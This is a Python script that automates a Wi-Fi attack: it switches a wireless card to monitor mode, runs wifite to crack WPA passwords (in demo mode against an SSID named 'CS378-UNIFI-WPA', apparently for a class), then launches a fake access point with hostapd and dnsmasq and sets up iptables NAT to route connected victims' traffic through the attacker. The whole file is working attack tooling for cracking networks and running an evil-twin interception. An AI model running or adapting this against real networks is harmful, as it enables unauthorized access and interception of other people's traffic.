#!/usr/bin/env python

import os
import subprocess
from time import sleep

if os.geteuid() != 0:
    print("\nThis script requires you to run it with root privileges.\n")
    exit(0)

    #Make sure that the interface isn't already in monitor mode!
def run_wifite(mon_name, demo):
    try:
        os.system("airmon-ng check kill")
        os.system("ifconfig %s down" %mon_name)
        os.system("airmon-ng start %s" %mon_name)
        cmd = "ifconfig | grep mon | awk -F ':' '{print $1}' | awk '{print $1}'"
        mon_mode = str(os.popen(cmd).read()).strip('\n')
        if demo:
                os.system("wifite -mac -e CS378-UNIFI-WPA --dict demolist.txt -i %s" %mon_mode)
        else:
                os.system("wifite -mac -i %s " %mon_mode)
        return mon_mode
    except KeyboardInterrupt:
        print ("WiFite setup failed, exiting")


def network_restore(mon_name):
    os.system("airmon-ng stop %s" %mon_name)
    os.system("service network-manager restart")
    os.system("service networking restart")

if __name__ == "__main__":
    #Print out wireless interfaces

    os.system("iwconfig")
    print ("Do you have at least 2 wireless interfaces before proceeding?")

    demo = raw_input ("Run demo code?")
    monitor_name = raw_input ("What is the name of your wireless interface that supports monitor mode?")
    ap_name = raw_input("What is the name of your AP wireless interface? ")

    print ("\nStarting WiFite with monitor interface")
    mon_name = run_wifite(monitor_name, demo)

    if demo:
             raw_input ("Continue?")

    #if we want to provide internet we need to reset the interfaces
    print("Restart network interfaces")
    network_restore(mon_name)

    #Set the AP interface to the BSSID of cracked network and necessary routing
    #of the ip tables to forward internet
    os.system("ifconfig wlan0 down")
    os.system("ifconfig wlan0 inet 192.168.2.1 netmask 255.255.255.0")
    #os.system("ifconfig wlan0 hw ether 0c:80:63:1a:a7:33")
    os.system("ifconfig wlan0 up")

    os.system("route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1")


    #build config file for hostapd
    
    #os.system("pkill -u nobody")

    if demo:
             raw_input ("Continue to launch fake AP?")

    #dnsmasq start
    os.system("dnsmasq -C dnsmasq.conf")    
    #start the fake AP
    os.system("hostapd fakeAP.conf")

    if demo:
             raw_input ("Connect to the internet")
    os.system("iptables -t nat -A POSTROUTING --out-interface wlan1 -j MASQUERADE")
    os.system("iptables -A FORWARD --in-interface wlan0 -j ACCEPT")



       
    
